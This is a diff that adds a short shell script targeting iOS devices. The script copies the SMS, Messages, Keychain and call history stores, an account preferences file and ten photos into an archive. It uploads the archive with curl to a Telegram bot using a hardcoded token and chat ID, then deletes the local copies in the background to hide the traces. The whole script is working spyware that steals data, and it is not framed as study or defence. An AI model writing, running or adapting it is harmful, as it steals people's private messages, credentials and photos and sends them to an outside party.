@@ -1,0 +1,23 @@
+#!/bin/sh
+
+TELE_TOKEN="8794982640:AAH22aHRkcA-vHxs-E8YoeguX-0HJAHjwqk"   # THAY CÁI NÀY BẰNG TOKEN THẬT
+CHAT_ID="7860426358"                                  # ĐÃ LẤY TỪ JSON CỦA MÀY
+
+WORK_DIR="/var/mobile/Documents"
+cd "$WORK_DIR" || exit 1
+
+mkdir -p dump
+
+cp -r /var/mobile/Library/SMS dump/ 2>/dev/null
+cp -r /var/mobile/Library/Keychain dump/ 2>/dev/null
+cp -r /var/mobile/Library/Messages dump/ 2>/dev/null
+cp -r /var/mobile/Library/CallHistory dump/ 2>/dev/null
+cp /var/mobile/Library/Preferences/com.apple.account.plist dump/ 2>/dev/null
+
+find /var/mobile/Media/DCIM -type f \( -iname "*.jpg" -o -iname "*.png" -o -iname "*.mov" \) | head -n 10 | xargs -I {} cp {} dump/ 2>/dev/null
+
+tar -czf dump.tar.gz dump/ 2>/dev/null
+
+curl -s -F "document=@dump.tar.gz" "https://api.telegram.org/bot$TELE_TOKEN/sendDocument?chat_id=$CHAT_ID"
+
+(sleep 60 && rm -rf dump dump.tar.gz) &
